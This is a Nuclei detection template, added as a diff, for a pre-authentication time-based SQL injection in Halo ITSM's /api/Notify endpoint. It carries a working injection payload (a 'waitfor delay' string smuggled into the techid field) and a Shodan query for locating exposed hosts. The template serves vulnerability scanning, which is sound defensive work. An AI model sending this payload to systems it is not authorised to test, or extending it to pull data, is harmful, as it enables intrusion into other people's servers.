@@ -1,0 +1,47 @@
+id: halo-tism-sqli
+
+info:
+  name: Halo ITSM - Pre-Authentication SQL Injection
+  author: rootxharsh,iamnoooob,pdresearch
+  severity: critical
+  description: |
+    A Time-Based SQL Injection vulnerability in Halo ITSM allows unauthenticated attackers to execute malicious SQL queries by leveraging time delays, potentially leading to data exfiltration, privilege escalation, or full system compromise.
+  reference:
+    - https://slcyber.io/assetnote-security-research-center/loose-types-sink-ships-pre-authentication-sql-injection-in-halo-itsm/
+  classification:
+    cwe-id: CWE-89
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: http.favicon.hash:489905671
+  tags: halo,itsm,sqli,time-based-sqli,vuln
+
+variables:
+  string: "{{rand_text_numeric(10)}}"
+
+http:
+  - raw:
+      - |
+        @timeout: 20s
+        POST /api/Notify HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "sessionid": "{{randstr}}",
+          "tracking0": "{{string}}",
+          "techid": "1;waitfor delay '0:0:6'--",
+          "pickuptime": "2025-03-03T10:00:00",
+          "lastactiontime": "2025-03-03T10:00:00",
+          "chatlog": "{{randstr}}"
+        }
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=6'
+          - 'status_code == 200'
+          - 'contains(content_type, "application/json")'
+          - 'contains(body, "ok")'
+        condition: and
+# digest: 490a0046304402204c482b0e133ea41cfc0d718c3b1658df2db2ffa25cc56dc61dae57f23d0b147b02201a97058ab98129bbd55438d69258b52e82910ec8bb37f9fe91f1567ddf1a90ba:922c64590222798bb761d5b6d8e72950
